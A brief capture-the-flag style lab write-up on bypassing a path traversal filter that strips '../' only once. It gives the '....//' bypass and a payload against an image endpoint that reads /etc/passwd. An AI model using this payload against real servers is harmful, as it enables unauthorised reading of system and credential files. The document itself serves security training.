# Lab: File path traversal, traversal sequences stripped non-recursively

## Analysis: 

....//

/image?filename=64.jpg

/var/www/images

## Payload:

/image?filename=....//....//....//etc/passwd 

